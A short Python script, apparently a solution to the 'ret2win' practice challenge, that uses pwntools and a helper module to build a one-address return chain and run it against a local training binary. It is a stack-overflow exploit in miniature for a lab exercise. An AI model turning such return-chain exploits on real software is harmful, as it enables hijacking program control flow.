#!/usr/bin/python

import sys
import pwn
import time

import util

def main():
    chain = util.chain([0x00400811])
    print chain
    print util.runchain('./ret2win', chain)

if __name__ == '__main__':
    main()
